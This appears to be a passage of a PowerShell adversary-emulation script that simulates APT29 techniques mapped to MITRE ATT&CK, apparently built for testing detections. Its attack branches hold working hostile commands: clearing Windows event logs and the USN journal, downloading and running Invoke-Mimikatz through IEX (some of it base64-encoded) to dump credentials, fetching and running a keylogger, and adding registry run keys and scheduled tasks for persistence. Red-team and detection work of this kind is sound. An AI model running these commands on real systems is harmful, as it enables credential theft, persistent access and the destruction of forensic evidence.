if ( $T1107 ) {
    
    $information = @"
APT29 used SDelete to remove artifacts from victims

Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1107/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this attack"
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Creating and deleting a new file in the TEMP directory named T1107.txt"
        Write-Host "Note - To more realistically simulate APT29, download and leverage SDelete to remove target files."
        New-Item $env:TEMP\T1107.txt
        Remove-Item -path $env:TEMP\T1107.txt
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "You must pass the -attack flag to utilize this technique"
        Write-Host ""
    }
}

# T1070 - Indicator Removal on Host
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1070
if ( $T1070 ) {
    
    $information = @"
APT29 used SDelete to remove artifacts from victims

Adversaries may delete or alter generated artifacts on a host system, including logs and potentially captured files such as quarantined malware. Locations and format of logs will vary, but typical organic system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/* .

Actions that interfere with eventing and other notifications that can be used to detect intrusion activity may compromise the integrity of security solutions, causing events to go unreported. They may also make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1070/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1070
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host "[ 1 ] - Clear Windows Event Logs"
        Write-Host "[ 2 ] - Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume."
        break;
    }

    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Clearing 'System', 'Application', and 'Security' event logs!"
            wevtutil cl System
            wevtutil cl Application
            wevtutil cl Security
            Write-Host "Run this command from a command prompt to test clearing of other logs:"
            Write-Host "wevtutil cl {LOG NAME}" -ForegroundColor Gray
        } elseif ( $variant -eq 2 ) {
            Write-Host "Wiping the USN Change Journal using the following command:"
            Write-Host "fsutil usn deletejournal /D C:" -ForegroundColor Gray
            fsutil usn deletejournal /D C:
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-2). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1188 - Multi-hop Proxy
if ( $T1188 ) {
    
    $information = @"
A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.

To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "This attack must be configured and executed manually..."
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "This attack must be configured and executed manually..."
        Write-Host ""
    }
}

# T1075 - Pass the Hash
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1075
if ( $T1075 ) {

    $information = @"
APT29 leveraged Pass the Hash (PtH) to pivot and move laterally.

Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.
    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1075/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Mimikatz local - PowerShell"
        Write-Host "[ 2 ] - Mimikatz local - Encoded PowerShell"
        Write-Host "[ 3 ] - Mimikatz remote - PowerShell Invoke Command"
        Write-Host "[ 4 ] - Mimikatz remote - Mimikatz Pass the Hash"
        Write-Host "[ 5 ] - Mimikatz Kerberos Ticket Attack"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    } 
    
    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Mimikatz Local Download and Execute"
            Write-Host "Running Empire's version of Mimikatz via PowerShell's Invoke Expression"
            Write-Host "Warning: This test may be blocked by your Anti Virus" -ForegroundColor Red
            IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
        } elseif ( $variant -eq 2 ) {
            Write-Host "Encoded Mimikatz Local Download and Execute"
            Write-Host "Decoding and running Empire's version of Mimikatz via PowerShell's Invoke Expression"
            Write-Host "Warning: This test may be blocked by your Anti Virus" -ForegroundColor Red
            powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQgBDAC0AUwBFAEMAVQBSAEkAVABZAC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBDAG8AbQBtAGEAbgBkACAAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA
        } elseif ( $variant -eq 3) {
            Write-Host "Dumping Credentials with Invoke-Mimikatz on a remote system (localhost) via PowerShell"
            Write-Host "Note - Modify this line to target a remote host if desired"
            Write-Host "Warning: This test may be blocked by your Anti Virus" -ForegroundColor Red
            Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQgBDAC0AUwBFAEMAVQBSAEkAVABZAC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBDAG8AbQBtAGEAbgBkACAAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA}
        } elseif ( $variant -eq 4 ) {
            Write-Host "Mimikatz Local Pass the Hash Privilege Escalation"
            Write-Host "Dumping the credentials and spawming an administrative command shell with the following command:"
            Write-Host "mimikatz # sekurlsa::pth /user:{user_name} /domain:{domain} /ntlm:{ntlm}" -ForegroundColor Gray
            Write-Host "Once the attack is customized to your environment, replace this line"
            Write-Host "Warning: This test may be blocked by your Anti Virus" -ForegroundColor Red
        } elseif ( $variant -eq 5 ) {
            Write-Host "Mimikatz Local Kerberos Ticket Attack"
            Write-Host "Grabbing a kerberos ticket and escalating using the following command:"
            Write-Host "mimikatz # kerberos::ptt {user_name}@{domain}" -ForegroundColor Gray
            Write-Host "Once the attack is customized to your environment, replace this line"
            Write-Host "Warning: This test may be blocked by your Anti Virus" -ForegroundColor Red
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-5). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1086 - PowerShell
if ( $T1086 ) {
    
    $information = @"
APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke. APT29 also used PowerShell scripts to evade defenses.

PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "This script by itself is a test of PowerShell \( ﾟヮﾟ)/"
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "This script itself is a test of PowerShell \( ﾟヮﾟ)/"
        Write-Host ""
    }
}

# T1060 - Registry Run Keys / Startup Folder
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1060
if ( $T1060 ) {
    
    $information = @"
APT29 added Registry Run keys to establish persistence.

Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1060/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1060
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Run Key Persistence"
        Write-Host "[ 2 ] - RunOnce Key Persistence"
        Write-Host "[ 3 ] - PowerShell Registry RunOnce"
        Write-Host "[ 4 ] - Startup Folder"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    } 

    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Establishing persistence via Registry Key - Run"
            Write-Host "Run the following command via command prompt:"
            Write-Host 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Run Key Persistence" /t REG_SZ /F /D "{thing_to_execute}"' -ForegroundColor Gray
            Write-Host 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Run Key Persistence" /f' -ForegroundColor Gray
        } elseif ( $variant -eq 2 ) {
            Write-Host "Establishing persistence via Registry Key - RunOnce"
            Write-Host "Run the following command via command prompt:"
            Write-Host 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "{thing_to_execute}"' -ForegroundColor Gray
            Write-Host 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f' -ForegroundColor Gray
        } elseif ( $variant -eq 3 ) {
            Write-Host "Establishing persistence via PowerShell - Registry Key RunOnce"
            $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
            Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
        } elseif ( $variant -eq 4 ) {
            Write-Host "Adding a Shortcut To Startup via PowerShell"
            $TargetFile = "$env:SystemRoot\System32\{thing_to_execute}"
            $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
            $Shortcut.TargetPath = $TargetFile
            $Shortcut.Save()
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-4). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1053 - Scheduled Task
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1053
if ( $T1053 ) {
    
    $information = @"
APT29 used named and hijacked scheduled tasks to establish persistence.

Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1053/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1053
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - At.exe Scheduled task"
        Write-Host "[ 2 ] - Scheduled task Local"
        Write-Host "[ 3 ] - Scheduled task Remote"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Scheduling task via AT Job:"
            Write-Host "    at 13:20 /interactive cmd" -ForegroundColor Gray
            at 13:20 /interactive cmd.exe /C 'echo hi'
        } elseif ( $variant -eq 2 ) {
            Write-Host "Scheduling a task to launch calc.exe at 1300 via SCHTASKS:"
            Write-Host "    SCHTASKS /Create /SC ONCE /TN spawn /TR {task_command} /ST {time}" -ForegroundColor Gray
            SCHTASKS /Create /SC ONCE /TN spawn /TR calc.exe /ST 13:00
        } elseif ( $variant -eq 3 ) {
            Write-Host "Scheduling a task on a remote host (manually configure this command using domain credentials):"
            Write-Host '    SCHTASKS /Create /S {target} /RU {user_name} /RP {password} /TN "Atomic task" /TR "{task_command}" /SC daily /ST {time}' -ForegroundColor Gray
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-3). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1056 - Keylogging
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1056
if ( $T1056 ) {
    
    $information = @"

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this technique - create and execute a PowerShell script."
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Downloading and executing the 'get-keystrokes.ps1' PowerSploit script in memory"
        Write-Host "Keystrokes will be logged to C:\keys.log"
        Write-Host "The keylogger will run for 30-minutes and then terminate..."
        $source = "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/Get-Keystrokes.ps1"
        $logfile = "C:\key.log"
        IEX (New-Object Net.WebClient).DownloadString($source)
        Get-Keystrokes -LogPath $logfile -Timeout 30
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack. The keylogger times out after 30-minutes."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "You must pass the -attack flag to utilize this technique"
        Write-Host ""
    }
}

# T1064 - Scripting
if ( $T1064 ) {
    
    $information = @"
APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke, as well as to evade defenses.

Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this technique - create and execute a PowerShell script."
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Creating a PowerShell script named test.ps1 in the current directory:"
        Write-Output "Write-Output 'hello'" > test.ps1
        .\test.ps1
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "You must pass the -attack flag to utilize this technique"
        Write-Host ""
    }
}

# T1045 - Software Packing
if ( $T1045 ) {
    
    $information = @"
APT29 used UPX to pack files.

Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "To demonstrate this variant, utilize UPX to create a payload and deploy this to a host"
        Write-Host "More details: https://attack.mitre.org/techniques/T1045/"
        Write-Host "UPX Download: https://github.com/upx/upx/releases/download/v3.95/upx-3.95-win64.zip"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "To demonstrate this variant, utilize UPX to create a payload and deploy this to a host"
        Write-Host "More details: https://attack.mitre.org/techniques/T1045/"
        Write-Host "UPX Download: https://github.com/upx/upx/releases/download/v3.95/upx-3.95-win64.zip"
        Write-Host ""
    }
}

# T1193 - Spearphishing Attachment
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1193
if ( $T1193 ) {
    
    $information = @"
APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.

Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1193/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1193
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this technique - VBScript"
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Simulating Downloading a Phishing Attachment and opening a macro-enabled excel document that opens your browser to google.com"
        if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
            return 'Please install Microsoft Excel before running this test.'
        }
        else {
            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/PhishingAttachment.xlsm'
            $fileName = 'PhishingAttachment.xlsm'
            New-Item -Type File -Force -Path $fileName | out-null
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            ($wc.DownloadString("$url")) | Out-File $fileName
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "You must pass the -attack flag to utilize this technique"
        Write-Host ""
    }
}

# T1192 - Spearphishing Link
if ( $T1192 ) {
    
    $information = @"
APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.

Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1192/

    Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "Utilize a web browser to visit a phishing website that you have crafted"
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Utilize a web browser to visit a phishing website that you have crafted"
        Write-Host ""
    }
}

# T1204 - User Execution
if ( $T1204 ) {
    
    $information = @"
APT29 has used various forms of spearphishing attempting to get a user to open links or attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files.

An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1204/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "This attack requires user-interaction."
        Write-Host "Perform a post-exploitation attack such as UAC Bypass with prompt to simulate a possible variant of this activity"
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "This attack requires user-interaction."
        Write-Host "Perform a post-exploitation attack such as UAC Bypass with prompt to simulate a possible variant of this activity"
        Write-Host ""
    }
}

# T1047 Windows Management Instrumentation
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1047
if ( $T1047 ) {

    $information = @"
APT29 used WMI to steal credentials and execute backdoors at a future time.

Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1047/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1047
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - WMI Reconnaissance - Users"
        Write-Host "[ 2 ] - WMI Reconnaissance - Processes"
        Write-Host "[ 3 ] - WMI Reconnaissance - Software"
        Write-Host "[ 4 ] - WMI Reconnaissance - Enumerate Endpoint Protection"
        Write-Host "[ 5 ] - WMI Reconnaissance - List Remote Services"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }
    
    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "WMI Reconnaissance - User"
            Write-Host "Executing the following command:"
            Write-Host "wmic useraccount get /ALL" -ForegroundColor Gray;
            wmic useraccount get /ALL
        } elseif ( $variant -eq 2 ) {
            Write-Host "WMI Reconnaissance - Processes"
            Write-Host "Executing the following command:"
            Write-Host "wmic process get caption,executablepath,commandline" -ForegroundColor Gray
            wmic process get caption,executablepath,commandline
        } elseif ( $variant -eq 3 ) {
            Write-Host "WMI Reconnaissance - Software"
            Write-Host "Executing the following command:"
            Write-Host "wmic qfe get description,installedOn /format:csv" -ForegroundColor Gray
            wmic qfe get description,installedOn /format:csv
        } elseif ( $variant -eq 4 ) {
            Write-Host "WMI Reconnaissance - Enumerate Endpoint Protection"
            Write-Host "Executing the following command:"
            Write-Host "Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntiVirusProduct" -ForegroundColor Gray
            Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
        } elseif ( $variant -eq 5 ) {
            Write-Host "WMI Reconnaissance - List Remote Services"
            Write-Host "Executing the following using the command prompt:"
            Write-Host 'wmic /node:"{TARGET}" service where (caption like "%{SERVICE SEARCH STRING (eg: sql server)} (%")' -ForegroundColor Gray
            wmic /node:127.0.0.1 service
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-4). Use -listVariants to see the available options."
        Write-Host ""
    }
